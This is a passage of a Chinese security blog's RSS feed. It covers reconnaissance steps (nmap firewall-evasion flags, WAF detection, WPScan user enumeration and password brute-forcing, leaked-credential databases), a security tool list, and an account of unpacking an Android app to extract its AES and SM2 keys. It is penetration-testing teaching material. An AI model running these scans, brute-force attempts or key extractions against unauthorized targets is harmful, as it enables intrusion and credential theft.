id="3-1-绕过cdn"><a href="#3-1-绕过cdn" class="headerlink" title="3.1 绕过cdn"></a>3.1 绕过cdn</h2><p><strong>3.1.1 确定有无cdn</strong></p><p>（1）很简单，使用各种多地 ping 的服务，查看对应 IP 地址是否唯一，如果不唯一多半是使用了CDN， 多地 Ping 网站有：<br><a href="http://ping.chinaz.com/">http://ping.chinaz.com/</a><br><a href="http://ping.aizhan.com/">http://ping.aizhan.com/</a></p><p>(2)使用 nslookup 进行检测，原理同上，如果返回域名解析对应多个 IP 地址多半是使用了 CDN。有 CDN 的示例：</p><p><strong>3.1.2 绕过cdn</strong></p><h2 id="3-2-c段，旁站ip"><a href="#3-2-c段，旁站ip" class="headerlink" title="3.2 c段，旁站ip"></a>3.2 c段，旁站ip</h2><p>旁站：是和目标网站在同一台服务器上的其它的网站。</p><p>C端：是和目标服务器ip处在同一个C段的其它服务器。</p><h3 id="3-2-1-网站扫描"><a href="#3-2-1-网站扫描" class="headerlink" title="3.2.1 网站扫描"></a>3.2.1 网站扫描</h3><p><a href="http://www.webscan.cc/">http://www.webscan.cc/</a></p><p> <a href="http://s.tool.chinaz.com/same">http://s.tool.chinaz.com/same</a>  </p><p><a href="https://phpinfo.me/bing.php%EF%BC%88%E5%8F%AF%E8%83%BD%E8%AE%BF%E9%97%AE%E4%B8%8D%E4%BA%86%EF%BC%89">https://phpinfo.me/bing.php（可能访问不了）</a></p><h3 id="3-2-2-工具"><a href="#3-2-2-工具" class="headerlink" title="3.2.2 工具"></a>3.2.2 工具</h3><p>神器   ： <a href="https://github.com/robertdavidgraham/masscan">https://github.com/robertdavidgraham/masscan</a></p><p>御剑1.5：<strong><a href="https://download.csdn.net/download/peng119925/10722958">https://download.csdn.net/download/peng119925/10722958</a></strong></p><p>C端查询：IIS PUT Scanner（扫描速度快，自定义端口，有banner信息）</p><p>Nmap：语法：nmap  -p  80,8080  –open  ip/24 </p><h1 id="4-端口信息"><a href="#4-端口信息" class="headerlink" title="4 端口信息"></a>4 端口信息</h1><p>对网站域名对应的真实IP地址进行端口测试，很多有防护不能大批量扫描和漏洞测试。</p><h2 id="4-1-网站"><a href="#4-1-网站" class="headerlink" title="4.1 网站"></a>4.1 网站</h2><p><a href="http://coolaf.com/tool/port">http://coolaf.com/tool/port</a></p><p><a href="https://tool.lu/portscan/index.html">https://tool.lu/portscan/index.html</a> </p><h2 id="4-2-工具"><a href="#4-2-工具" class="headerlink" title="4.2 工具"></a>4.2 工具</h2><p>常见工具就是nmap(功能强大)、masscan、zmap和御剑tcp端口高速扫描工具(较快)。</p><p>扫描思路：我们可以在收集子域对应的的ip后整理到txt中，然后nmap批量端口扫描、服务爆破和漏洞扫描，前提是不被封禁IP，可采用代理池。</p><p>nmap -iL ip.txt –script=auth,vuln &gt; finalscan.txt 扫描导出常见端口和漏洞。</p><p>常见端口说明和攻击方向整理如下：<a href="https://m01ly.github.io/2020/09/04/pt-portinfo/">https://m01ly.github.io/2020/09/04/pt-portinfo/</a></p><pre><code> nmap 10.0.1.161  -p 1-65535 </code></pre><pre class="line-numbers language-bash"><code class="language-bash">nmap 过防火墙参数：-mtu 数据包最大传输单元--data-length 设置数据包的长度--scan-delay  延迟一定的时间发包，主要用于绕过频率的限制--randomize-hosts 对批量目标随机IP进行扫描，适合批量目标一起扫的情况<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>大部分情况下使用上面的参数或者多个参数进行组合即可绕过防火墙进行扫描。</p><h1 id="5-网站信息收集"><a href="#5-网站信息收集" class="headerlink" title="5  网站信息收集"></a>5  网站信息收集</h1><p> 网站信息信息收集主要是：操作系统，中间件，脚本语言，数据库，服务器，web容器、waf、cdn、cms、历史漏洞、dns区域传送等，可以使用以下方法查询。 </p><p> 常见指纹工具：御剑web指纹识别、轻量级web指纹识别、whatweb等 </p><h2 id="5-1-web指纹"><a href="#5-1-web指纹" class="headerlink" title="5.1 web指纹"></a>5.1 web指纹</h2><p>web指纹：操作系统，框架，脚本语言，web容器，服务器，数据库，版本号等</p><p>潮汐指纹：<a href="http://finger.tidesec.net/%EF%BC%88%E6%8E%A8%E8%8D%90%EF%BC%89">http://finger.tidesec.net/（推荐）</a></p><p>云悉(现在需要邀请码)：<a href="http://www.yunsee.cn/info.html">http://www.yunsee.cn/info.html</a></p><p>CMS指纹识别：<a href="http://whatweb.bugscaner.com/look/">http://whatweb.bugscaner.com/look/</a></p><h2 id="5-2-Waf-识别"><a href="#5-2-Waf-识别" class="headerlink" title="5.2 Waf 识别"></a>5.2 Waf 识别</h2><h3 id="5-2-1-wafw00f"><a href="#5-2-1-wafw00f" class="headerlink" title="5.2.1 wafw00f"></a>5.2.1 wafw00f</h3><p>kali上自带wafw00f，一条命令直接使用。建议最好在kali下使用，windows下的使用很麻烦。Nmap上也包含识别waf指纹的脚本模块。 </p><p>下载地址： <a href="https://github.com/EnableSecurity/wafw00f">https://github.com/EnableSecurity/wafw00f</a>  </p><p>WAFW00F探测WAF </p><pre><code>命令：wafw00f  -a  域名</code></pre><h3 id="5-2-2-nmap"><a href="#5-2-2-nmap" class="headerlink" title="5.2.2 nmap"></a>5.2.2 nmap</h3><p>Nmap探测WAF有两种脚本。</p><p>一种是http-waf-detect。</p><pre><code>命令：nmap  -p80,443  --script=http-waf-detect  ip</code></pre><p>一种是http-waf-fingerprint。</p><pre><code>命令：nmap  -p80,443  --script=http-waf-fingerprint  ip</code></pre><h1 id="6-敏感目录文件收集"><a href="#6-敏感目录文件收集" class="headerlink" title="6 敏感目录文件收集"></a>6 敏感目录文件收集</h1><p>攻防测试中探测web目录和隐藏的敏感文件是很重要环境，从中可以获取网站后台管理页面、文件上传界面、备份文件、WEB-INF、robots、svn和源代码等。</p><p>主要通过工具扫描，主要有</p><p>（0）御剑–很强大（互联网有很多字典加强版）</p><p>（1） dirb   目录爆破dirb是必用的一款工具，因为它可以做目录的递归爆破</p><p>（2）7kbstorm <a href="https://github.com/7kbstorm/7kbscan-WebPathBrute">https://github.com/7kbstorm/7kbscan-WebPathBrute</a></p><p> （3）搜索引擎（Google、baidu、bing等），搜索引擎搜索敏感文件也较为常见，一般是这样：site:xxx.xxx filetype:xls。 </p><p> （4）爬虫-扫描器（AWVS、Burpsuite、Nessus等） </p><p> （5）BBscan（lijiejie大佬的脚本：<a href="https://github.com/lijiejie/BBScastorn">https://github.com/lijiejie/BBScastorn</a> ） </p><p> （6）凌风云搜索：<a href="https://www.lingfengyun.com/%EF%BC%88%E9%83%A8%E5%88%86%E7%94%A8%E6%88%B7%E5%8F%AF%E8%83%BD%E4%B8%8A%E4%BC%A0%E4%BA%91%E7%9B%98%E8%A2%AB%E5%9C%A8%E7%BA%BF%E6%8A%93%E5%8F%96%EF%BC%89">https://www.lingfengyun.com/（部分用户可能上传云盘被在线抓取）</a> </p><p> （6）github搜索</p><h1 id="7-社会工程学收集"><a href="#7-社会工程学收集" class="headerlink" title="7 社会工程学收集"></a>7 社会工程学收集</h1><p>我们可以通过社工库查询一些关键信息。对于很多社工库来说，存储达到T，数据量达到亿级别都是小case。内容方面包括帐号密码、邮箱地址、个人信息等等。</p><p>互联网社工库，威力有多大，就看数据库的数量和质量了，理论上达到了一定的量，很多的东西都是可以查的出来的，特别是那些基本所有网站都一个密码的，只要一个社工库的收集的其中一个数据库有他的帐号密码，那么查出来的密码就可以直接登陆该用户的其他帐号了。</p><h1 id="8-常见CMS扫描"><a href="#8-常见CMS扫描" class="headerlink" title="8 常见CMS扫描"></a>8 常见CMS扫描</h1><h2 id="8-1-wordpress"><a href="#8-1-wordpress" class="headerlink" title="8.1 wordpress"></a>8.1 wordpress</h2><p> <code>WPScan</code>是一个扫描 <code>WordPress</code> 漏洞的黑盒子扫描器，它可以为所有 <code>Web</code> 开发人员扫描 <code>WordPress</code> 漏洞并在他们开发前找到并解决问题。 </p><h3 id="8-1-1-安装教程"><a href="#8-1-1-安装教程" class="headerlink" title="8.1.1 安装教程"></a>8.1.1 安装教程</h3><p>（1）安装：</p><p>windows平台不支持，kaili系统自带，其他平台安装教程见：<a href="https://xz.aliyun.com/t/2794">https://xz.aliyun.com/t/2794</a></p><p>你可以使用下列命令在自己的设备中安装WPScan</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">git</span> clone https://github.com/wpscanteam/wpscan.git<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（2）更新</p><pre class="line-numbers language-bash"><code class="language-bash">wpscan --update <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="8-1-2-使用"><a href="#8-1-2-使用" class="headerlink" title="8.1.2 使用"></a>8.1.2 使用</h3><p><strong>（1）扫描漏洞</strong></p><pre class="line-numbers language-bash"><code class="language-bash">wpscan --url https://www.xxxxx.wiki/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>结果中红色为高危漏洞，绿色为Info</p><p><strong>（2）扫描用户</strong></p><pre class="line-numbers language-bash"><code class="language-bash">wpscan --url https://www.xxxxxxx.wiki/ --enumerate u<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>获取用户名后，可以进一步加字典爆破：</p><pre class="line-numbers language-bash"><code class="language-bash">wpscan --url https://www.xxxxx.wiki/ -e u --wordlist /root/password.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>(3) 扫描插件漏洞</p><p>扫描所用插件：</p><pre class="line-numbers language-bash"><code class="language-bash">wpscan --url https://www.xxxxx.wiki/ -enumerate p<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>扫描插件漏洞：</p><pre class="line-numbers language-bash"><code class="language-bash">wpscan --url https://www.xxxxx.wiki/ -enumerate vp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>(4)扫描主题</p><p>扫描主题：wpscan –url <a href="https://www.xxxxx.wiki/">https://www.xxxxx.wiki</a> –enumerate t</p><p>扫描主题漏洞：wpscan –url <a href="https://www.xxxxxx.wiki/">https://www.xxxxxx.wiki</a> –enumerate vt</p><p>(5)文件漏洞扫描</p><pre class="line-numbers language-bash"><code class="language-bash">wpscan --url https://www.xxxxxx.wiki/ -enumerate tt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><a href="https://xz.aliyun.com/t/2794">https://xz.aliyun.com/t/2794</a></p><h1 id="9-福利"><a href="#9-福利" class="headerlink" title="9 福利"></a>9 福利</h1><h2 id="9-1-强大的搜索引擎"><a href="#9-1-强大的搜索引擎" class="headerlink" title="9.1 强大的搜索引擎"></a>9.1 强大的搜索引擎</h2><p>ZoomEy：<a href="https://www.zoomeye.org/">https://www.zoomeye.org/</a> </p><p>FoFa：<a href="https://fofa.so/">https://fofa.so/</a> </p><p>Dnsdb：<a href="https://www.dnsdb.io/zh-cn/">https://www.dnsdb.io/zh-cn/</a> </p><p>Shodan：<a href="https://www.shodan.io/">https://www.shodan.io/</a> </p><p>Censys：<a href="https://censys.io/">https://censys.io/</a> </p><p>御剑全家桶：<a href="http://www.moonsec.com/post-753.html">http://www.moonsec.com/post-753.html</a> </p><h2 id="9-2-工具"><a href="#9-2-工具" class="headerlink" title="9.2 工具"></a>9.2 工具</h2><p><a href="https://zhuanlan.zhihu.com/p/53112370">2019年Github上开源的安全渗透攻击类工具</a></p><p><a href="https://bbs.pediy.com/thread-261711.htm"> 2020版 github渗透测试工具库</a></p><p>参考：</p><p><a href="https://www.freebuf.com/articles/web/243210.html">https://www.freebuf.com/articles/web/243210.html</a></p>]]></content:encoded>
      
      
      
      <category domain="https://m01ly.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</category>
      
      
      <comments>https://m01ly.github.io/2020/09/28/pt-info-collection/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>最佳网络安全和黑客软件</title>
      <link>https://m01ly.github.io/2020/09/28/pt-tools/</link>
      <guid>https://m01ly.github.io/2020/09/28/pt-tools/</guid>
      <pubDate>Mon, 28 Sep 2020 03:14:51 GMT</pubDate>
      
      <description>&lt;h1 id=&quot;1-Probely&quot;&gt;&lt;a href=&quot;#1-Probely&quot; class=&quot;headerlink&quot; title=&quot;1.Probely&quot;&gt;&lt;/a&gt;1.Probely&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;https://probely.com/web-vulnerability-scanner/security-teams/&quot;&gt;https://probely.com/web-vulnerability-scanner/security-teams/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;probly扫描网络中的漏洞，帮助安全专业人员识别关键漏洞并及时修复。主要功能包括扫描SQL注入、XSS、应用程序漏洞等等。通过与JIRA和Slack的深入集成，此工具允许多个团队成员为整个网络评估过程做出贡献。入侵检测机制是一个额外的优势，以及各种网络报告。Probely扫描您的网络，不会留下任何东西，为安全专业人员带来更好的可见性。&lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="1-Probely"><a href="#1-Probely" class="headerlink" title="1.Probely"></a>1.Probely</h1><p><a href="https://probely.com/web-vulnerability-scanner/security-teams/">https://probely.com/web-vulnerability-scanner/security-teams/</a></p><p>probly扫描网络中的漏洞，帮助安全专业人员识别关键漏洞并及时修复。主要功能包括扫描SQL注入、XSS、应用程序漏洞等等。通过与JIRA和Slack的深入集成，此工具允许多个团队成员为整个网络评估过程做出贡献。入侵检测机制是一个额外的优势，以及各种网络报告。Probely扫描您的网络，不会留下任何东西，为安全专业人员带来更好的可见性。</p><a id="more"></a><h1 id="2-Netsparker"><a href="#2-Netsparker" class="headerlink" title="2.Netsparker"></a>2.Netsparker</h1><p><a href="https://www.netsparker.com/">https://www.netsparker.com/</a></p><p>Netsparket是另一个漏洞评估工具，它扫描网络中的SQL注入、XSS和其他web应用程序漏洞。这是一个云端和场所。Netsparket的最佳优点包括基于扫描技术的精确检测和特定证据。它还检测URL重写和404错误页面，以及与bug跟踪协议的无缝集成。高速扫描将是另一个特长，它可以在一天内扫描1000个网络应用程序。</p><h1 id="3-Wallarm"><a href="#3-Wallarm" class="headerlink" title="3.Wallarm"></a>3.Wallarm</h1><p><a href="https://wallarm.com/">https://wallarm.com/</a></p><p>Wallarm结合了机器学习来模拟api、应用程序和其他服务的安全性。这种与机器学习的集成使它能够测试并帮助DevOps部门在整个网络基础设施中设计更好的工作流。Wallarm的自动化WAF将与公共云、私有云和混合云协同工作，最终与AWS、CNCF和Google建立了良好的合作关系。Wallarm中的AI引擎帮助开发人员识别数据模式，利用引擎先前的遭遇消除弱点，帮助他们开发强大的安全代码，</p><h1 id="4-Acunetix"><a href="#4-Acunetix" class="headerlink" title="4.Acunetix"></a>4.Acunetix</h1><p><a href="https://www.acunetix.com/">https://www.acunetix.com/</a></p><p>Acunetix是安全专业人士最好的软件之一，因为它模仿黑客，从而使安全专业人士领先网络罪犯一步。它负责HTML5、JavaScript、SQL注入、XSS等等。所有的web应用程序和服务都被清楚地监控，以便更好地为任何意外的失败做好准备。除了web应用程序的漏洞之外，这一个还负责WordPress核心和插件。凭借快速扫描功能，Acunetix也是一个重要的软件安全专业人士需要拥有的。</p><h1 id="5-BurpSuite"><a href="#5-BurpSuite" class="headerlink" title="5.BurpSuite"></a>5.BurpSuite</h1><p><a href="https://portswigger.net/">https://portswigger.net/</a></p><p>Burpuite是一款优秀的web应用程序安全和黑客软件，用于安全测试；它的功能提供了重要的渗透测试程序。从映射到应用程序攻击向量的分析，这个工具是渗透测试团队的正确软件包。自动扫描程序、漏洞管理框架、广泛的法规遵从性报告、详细的扫描方法使Burpuite成为下一代安全评估工具。</p><h1 id="6-Angry-IP-Scanner"><a href="#6-Angry-IP-Scanner" class="headerlink" title="6.Angry IP Scanner"></a>6.Angry IP Scanner</h1><p><a href="https://angryip.org/">https://angryip.org/</a></p><p>Angry IP scanner是一款开源黑客软件，涵盖跨平台，为安全专业人士提供道德黑客功能。扫描本地网络、文件、命令行界面，以及许多数据获取程序，还可以帮助进行大量的数据导出。</p><h1 id="7-Qualys-Guard"><a href="#7-Qualys-Guard" class="headerlink" title="7.Qualys Guard"></a>7.Qualys Guard</h1><p><a href="https://www.qualys.com/">https://www.qualys.com/</a></p><p>Qualy Guard是另一家主要的安全供应商，帮助企业简化网络的安全性和法规遵从性。这个网络安全和黑客软件也有助于企业检查他们的云系统漏洞。处理数据漏洞、可见性、数据分析、实时威胁等。可靠性、准确性和简单性是Qualyguard的最佳优势。</p><h1 id="8-HashCat"><a href="#8-HashCat" class="headerlink" title="8.HashCat"></a>8.HashCat</h1><p><a href="https://hashcat.net/hashcat/">https://hashcat.net/hashcat/</a></p><p>HashCat是一个密码破解软件，它可以帮助恢复忘记的密码，并检查密码历史记录以执行审核和报告。</p><p>它是一个开放源代码平台，涵盖跨平台，负责同一网络内的多个设备，该平台配有集成的热监视器、内置基准系统，并支持分布式破解网络。最重要的是，它还支持网络的自动性能管理。</p><h1 id="REF："><a href="#REF：" class="headerlink" title="REF："></a>REF：</h1><p><a href="https://www.softwaretestinghelp.com/penetration-testing-tools/">https://www.softwaretestinghelp.com/penetration-testing-tools/</a></p><p><a href="https://www.guru99.com/learn-everything-about-ethical-hacking-tools-and-skills.html">https://www.guru99.com/learn-everything-about-ethical-hacking-tools-and-skills.html</a></p>]]></content:encoded>
      
      
      
      <category domain="https://m01ly.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</category>
      
      
      <comments>https://m01ly.github.io/2020/09/28/pt-tools/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>小白如何在三天一步步逆向app，找到私钥</title>
      <link>https://m01ly.github.io/2020/09/18/mobilesecurity-experience/</link>
      <guid>https://m01ly.github.io/2020/09/18/mobilesecurity-experience/</guid>
      <pubDate>Fri, 18 Sep 2020 09:02:36 GMT</pubDate>
      
      <description>&lt;p&gt;本人今年应届生，就职于甲方安全，研究生期间主要做开发，偶尔做做渗透，护护网；工作了呢，主要维护内部系统的安全，对于移动逆向这块，只简单用burpsuite，顺顺利利抓过app的包。突然有一天，老大说，有个app，fiddler抓包，服务器不响应客户端发的包，让看看咋回事？于是就有了接下来三天不吃不喝不眠不休的入坑爬坑的过程~·所有用到的工具，都在文章开头列出&lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>本人今年应届生，就职于甲方安全，研究生期间主要做开发，偶尔做做渗透，护护网；工作了呢，主要维护内部系统的安全，对于移动逆向这块，只简单用burpsuite，顺顺利利抓过app的包。突然有一天，老大说，有个app，fiddler抓包，服务器不响应客户端发的包，让看看咋回事？于是就有了接下来三天不吃不喝不眠不休的入坑爬坑的过程~·所有用到的工具，都在文章开头列出</p><a id="more"></a><h1 id="1-工具"><a href="#1-工具" class="headerlink" title="1  工具"></a>1  工具</h1><h2 id="1-1-抓包工具"><a href="#1-1-抓包工具" class="headerlink" title="1.1 抓包工具"></a>1.1 抓包工具</h2><table><thead><tr><th>工具名称</th><th>使用平台</th><th>抓包类型</th><th>优点</th><th>缺点</th></tr></thead><tbody><tr><td>Wireshark</td><td>linux、windows</td><td>网络7层协议</td><td>linux平台支持好,功能强大，可抓网络7层的包</td><td>不能解析https的内容</td></tr><tr><td>Fidder</td><td>windows</td><td>http，https 和FTP协议</td><td>功能强大，支持修改报文，重放报文</td><td>仅支持windows</td></tr><tr><td>Charles</td><td>window、Mac</td><td>http,socket</td><td>可以按照域名进行分层级查看</td><td>需要收费</td></tr><tr><td>BurpSuite</td><td>支持java的平台</td><td>http,https</td><td>黑客喜欢用的功能强大工具，可以重放包，篡改包等进行一些包的攻击。</td><td>界面不是很好看</td></tr><tr><td>HttpCanary</td><td>Android</td><td>http,https，WebSocket</td><td>使用方便</td><td>只支持Android</td></tr></tbody></table><p>手机只能安装crt证书</p><h2 id="1-2-反汇编工具"><a href="#1-2-反汇编工具" class="headerlink" title="1.2 反汇编工具"></a>1.2 反汇编工具</h2><table><thead><tr><th>描述</th><th>所需要软件</th><th>步骤</th><th>优缺点</th></tr></thead><tbody><tr><td>较老一套</td><td>dex2jar:将dex转化成jar<br>JD-GUI : 反编译jar中的源码 <br>apktool.jar</td><td><a href="https://blog.csdn.net/qq_33721320/article/details/83413283">Android反编译apk逆向分析</a></td><td>使用复杂</td></tr><tr><td>上面工具的封装</td><td>AndroidKiller_v1.3.1</td><td><a href="https://wizardforcel.gitbooks.io/fl-android-re-tut/content/3.1.html">AndroidKiller教程</a></td><td>使用复杂</td></tr><tr><td>强大</td><td>jadx</td><td>直接拖apk到即可</td><td>使用方便</td></tr></tbody></table><h2 id="1-3-查壳工具："><a href="#1-3-查壳工具：" class="headerlink" title="1.3 查壳工具："></a>1.3 查壳工具：</h2><p>ApkScan</p><h2 id="1-4-脱壳工具："><a href="#1-4-脱壳工具：" class="headerlink" title="1.4 脱壳工具："></a>1.4 脱壳工具：</h2><p>反射大师，FDEX等</p><h1 id="2-逆向过程"><a href="#2-逆向过程" class="headerlink" title="2 逆向过程"></a>2 逆向过程</h1><p>·文章废话比较多，为了使各位看客看的明白，先抛出整个爬坑过程：<strong>抓包–》反汇编–》脱壳–》拿到私钥</strong></p><h2 id="2-1-抓包"><a href="#2-1-抓包" class="headerlink" title="2.1 抓包"></a>2.1 抓包</h2><p>话说回来，老大说fiddler抓包失败，于是乎，从网上下载fillder，用我的oppo手机装上证书，开始了第一次fiddler抓包之旅，网上随手找一篇<a href="https://www.jianshu.com/p/5a353e164e7c">抓包攻略</a>，发现连接失败，（这里有个坑：公司网络刚好不可以访问这个app，开始弄了好久，都是0字节，后面换了自己热点，就出现连接失败，说到这里真的想吐槽公司网络）</p><p>接着用我最熟悉的burpsuite抓包，发现抓不了https的包，证书也安装了呀，其他https请求都可以抓，刚开始以为是证书的问题，并且app，始终报错，证书校验错误，让我更加以为是证书的问题。。但是又没办法解决，，就想着再换个抓包工具，charls抓包后send成功，但是response都失败了。</p><p>这时候打开微信问问我以前实验室的大佬，听说现在搞app逆向，他推荐了一款手机抓包神器httpCanary，直接安装到手机，抓包是超级方便呀，但是令人奔溃的是app依旧报错，证书校验错误，到这里内心很奔溃，开始网上搜，抓包失败，发现了这篇文章<a href="https://www.cnblogs.com/magicalpig/p/12671559.html">部分APP使用burpsuite抓不到包原因</a>，猜测可能app使用了双向认证或SSL-pinning(证书绑定) ，并谷歌这两个词汇，理解如下：</p><p><strong>单向认证：</strong>一般的客户端所作的都是单向认证，即客户端只需要验证服务器端的证书，确保服务器来源的可靠性，服务器端无需验证客户端证书。</p><p><strong>双向认证：</strong>客户端验证服务器端证书，服务器端也需要验证客户端证书。</p><p><img src="/2020/09/18/mobilesecurity-experience/1602240311892.png" alt="1602240311892"></p><p><a href="https://zhuanlan.zhihu.com/p/58204817"><strong>SSL-pinning(证书绑定)：</strong></a></p><p><img src="/2020/09/18/mobilesecurity-experience/1602298885190.png" alt="1602298885190"></p><p>如上图所示： 证书锁定（SSL/TLS Pinning）提供了两种绑定方式： Certificate Pinning 和 Public Key Pinning，过程如下：</p><p>1）：首先对服务器端证书/证书中的公钥进行哈希，得到ssl指纹内置到app中。</p><p>2）：通信连接时，服务器发来证书。</p><p>3）：app对该证书进行哈希操作，将哈希值与app内置的ssl指纹进行对比，若对比成功，则建立连接，否则，断开连接。</p><p>弄懂双向认证和ssl-pinning原理后，结合中间人攻击原理（如下图），进行猜想如下：</p><p>1）如果该app使用的双向认证，即同时认证客户端证书，则在下图中间人与服务器端的交互中，中间人需要提供app的证书。客户端与中间人交互正常。</p><p>2）如果该app使用的是ssl-pinning，即客户端需要对服务器证书进行校验，则在下图客户端与中间人交互中，中间人的需要提供原有服务器端的证书。中间人与服务器端交互正常。</p><p><img src="/2020/09/18/mobilesecurity-experience/1602299413602.png" alt="1602299413602"></p><p>无论是app证书还是服务器端证书，女生第六感觉得app中可能会有，因此下一步想着逆向app，看下app里面有没有证书啥的，然后代理绑定原有证书就可以正常抓包了。（后面发现我是有多天真）</p><h2 id="2-2-反汇编"><a href="#2-2-反汇编" class="headerlink" title="2.2 反汇编"></a>2.2 反汇编</h2><p>开始网上搜索apk反汇编教程，搜到了一篇超详细利用四件套反汇编apk教程，<a href="https://blog.csdn.net/qq_33721320/article/details/83413283">Android反编译apk逆向分析</a> ,按照他的步骤，先解压apk，查看解压后的文件发现了几个证书，一个后缀为cer的证书（看到这个证书个人感觉app应该用了双向认证吧，当时我愚蠢的以为这个证书即是服务器证书，也是客户端证书，因此下一步目标明确为：代理安装客户端证书即可），一个后缀为bks的deb_keystore.bks（这个时候我还不知道bks是啥）。</p><p><img src="/2020/09/18/mobilesecurity-experience/1602311148129.png" alt="1602311148129"></p><p>下一步目标为中间人代理安装app客户端证书，我常用的工具为burpsuite，发现其可以导入客户端证书，在user options-&gt;ssl-Clinet ssl certificates下：<img src="/2020/09/18/mobilesecurity-experience/1602312160658.png" alt="1602312160658"></p><p>后面发现burp suite只可导入pem类型的证书，且需要输入密码，这时候我天真的以为密码可以读取反汇编后的源码中找，然后将可以将cer证书转为pem 证书，就可以成功导入客户端证书。但是反汇编后的dex源码可读性很差，并没有得到有用的东西，又看看cer证书转为pem证书格式，发现需要私钥，哎，这个时候打开微信，找找以前实验室的大佬，有没有好的反汇编工具推荐（这个时候一直以为反汇编工具不行），大佬推荐了jadx神器，直接拖拉apk即可，但是反汇编出的代码可读性仍然不太高，并没有有用的信息。但是收获了，不同格式证书的区别，<a href>总结在此</a>。于是又开始不断地谷歌，能否绕过ssl pinning(此时我也不确定是不是用了证书绑定还是双向认证，但是总得做点啥吧)，网上绕过ssl pinning需要 JustTrustMe，root手机啥的，我这刚买的oppo，也不能root呀，变搬砖了没钱买呀。尝试用模拟器呢，这个app简直了，首先尝试强大的夜神模拟器，app打开没反应，接着逍遥模拟器失败，mumu模拟器失败，天天模拟器失败，哎筋疲力尽的一天··········出去上了个厕所透透气 回来，app到底是不是用了ssl pining?或者双向认证？？？于是用httpCanary重新抓包详细看看了，这个时候突然有了重大发现，httpCanary抓包失败，有报错信息如下：</p><p><img src="/2020/09/18/mobilesecurity-experience/1602315130773.png" alt="1602315130773"></p><p>抓包失败因为Android 7.0以上，系统就不会信任安装用户的证书，也就是说，android不信任装的httpCanary根证书，当app进行交互时，没有可信任的根证书，因此交互失败。从下图的流程图可以看到，如果根证书可信，才会去判断该证书是否校验成功（ssl pinning/双向认证成功），因此，该app可能没有做双向认证或者ssl pinning，做没做找个android 7.0以下的手机试试就知道了。</p><p><img src="/2020/09/18/mobilesecurity-experience/1602316415405.png" alt="1602316415405"></p><p>第二天，从家里拿了个之前的老手机，android 6.0系统的，安装httpcanary抓包，安装目标app，进行登录，突然发现旧手机的触屏有问题，刚好按密码那块失灵了<del>我的天啊</del>··真的命途多舛，<del>·后面灵机一动，可以放大屏幕，移动到触屏好的区域输入即可（我可真是个小机灵鬼）</del>果然抓包成功！！！1喜大普奔啊啊啊啊<del>·昨天一天我是在搞啥呀</del>····</p><p>然后贼开心的去找老大，说可以抓到包了，老大说通信内容可以解密么？需要看通信数据。分析下报文发现：</p><p>客户端app发送给服务器端用的是sm2密文(客户端存sm2公钥加密，服务器端存私钥解密)，服务器端发送给客户端app的是AES密文（客户端和服务器端都存有AES对称密钥），即使逆向app，也只能发现AES密钥，sm2密钥存在服务器端，哎找到一个是一个吧，然后又开始漫漫长路~·…..</p><h2 id="2-3-脱壳"><a href="#2-3-脱壳" class="headerlink" title="2.3 脱壳"></a>2.3 脱壳</h2><p>之前反汇编的源码都没啥结果，又谷歌发现app是不是加了壳，做了代码混淆啥的，于是网上下载了查壳工具ApkScan，果然发现该app加了阿里聚安全的壳。然后在旧手机上开始了一系列脱壳之旅：</p><p>（1）首先使用网上教程<a href="https://www.jianshu.com/p/dbe579f6cc84">脱壳工具FDex2</a>,进行脱壳，（旧手机手机安装 VirtualXposed，FDex2+total conmander（自带amaze文件管理器下载打开失败）），但是并没有在data/data目录文件夹中看到dex文件，脱壳失败。</p><p>（2）然后使用网上超牛的反射大师进行脱壳，<a href="https://blog.csdn.net/qq_41855420/article/details/106276824">利用反射大师超详细脱壳教程</a>，使用反射大师3.0，3.5版本，脱壳后有5个dex文件，但是源码可读性还是较差，没有找到有用代码，感觉脱壳还是失败。</p><p>（3）尝试其他脱壳工具，。。都一一失败<del>···一无所获</del>·不知所向~···</p><p>就这样又一天过去了~····回家睡觉</p><p>第三天换了清醒的脑袋，开始查看别人的脱壳经历，逆向app经历，突然发现一篇有趣的文章：<a href="https://zhuanlan.zhihu.com/p/60392573">为了抓包某app,我折腾了10天,原来他是用SSL Pinning防抓包的</a>，看到楼主的经历，我内心也好过多了，翻看评论时候，看到有个读者提问密钥是怎么获取的，楼主说从低版本获取，这可是个重要信息呀。我立刻从网上下载了低版本，利用反射大师一顿操作猛如虎，逆向出8个dex文件，有7M,9M的，心想这下有希望了，果然逐个打开dex搜索AES，惊喜发现AES密钥：果然利用在线AES解密成功。</p><p><img src="/2020/09/18/mobilesecurity-experience/1602320940221.png" alt="1602320940221"></p><p>再搜索sm2_encrypt，发现sm2公钥和疑似sm2私钥（我的天，猜测app工程师用于测试忘记删除了）</p><p><img src="/2020/09/18/mobilesecurity-experience/1602321152209.png" alt="1602321152209"></p><p>将dex转为jar，IDE导入该库文件，调用apk中的sm2加解密函数，成功解密出交互密文！！</p><h1 id="3-总结"><a href="#3-总结" class="headerlink" title="3 总结"></a>3 